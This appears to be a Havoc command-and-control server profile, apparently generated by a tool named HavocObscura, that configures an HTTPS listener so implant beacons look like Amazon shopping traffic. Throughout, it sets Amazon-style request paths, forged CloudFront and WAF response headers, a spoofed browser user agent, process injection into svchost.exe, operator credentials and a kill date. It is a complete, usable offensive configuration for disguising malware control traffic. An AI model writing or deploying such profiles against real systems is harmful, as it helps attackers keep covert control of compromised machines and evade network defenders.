# Havoc C2 Profile
# Generated by HavocObscura
# Date: 2026-06-10
# Target: https://www.amazon.com

Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm       = "/usr/bin/nasm"
    }
}

Operators {
    user "operator" {
        Password = "changeme123"
    }
}

Demon {
    Sleep  = 20
    Jitter = 35

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\svchost.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\svchost.exe"
    }
}

Listeners {
    Http {
        Name         = "HTTPS - Amazon Shopping"
        Hosts        = ["<YOUR_C2_HOST>"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 443
        PortConn     = 443
        Secure       = true
        KillDate     = "2027-06-10 23:59:59"
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

        Uris = [
            "/gp/cart/view.html",
            "/gp/product/ajax",
            "/api/recommendations",
            "/gp/aod/ajax",
            "/s",
        ]

        Headers = [
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
            "Cache-Control: no-cache",
        ]

        Response {
            Headers = [
            "Content-Type: text/html; charset=UTF-8",
            "Server: CloudFront",
            "Cache-Control: no-store, max-age=0",
            "x-amzn-waf-action: challenge",
            "Access-Control-Allow-Origin: *",
            "Access-Control-Allow-Methods: OPTIONS,GET,POST",
            "Access-Control-Expose-Headers: x-amzn-waf-action",
            "X-Cache: Error from cloudfront",
            "Via: 1.1 5d30c0fb621781d1b876b873574bb1d8.cloudfront.net (CloudFront)",
            "X-Amz-Cf-Pop: LAX50-P5",
            ]
        }
    }

}


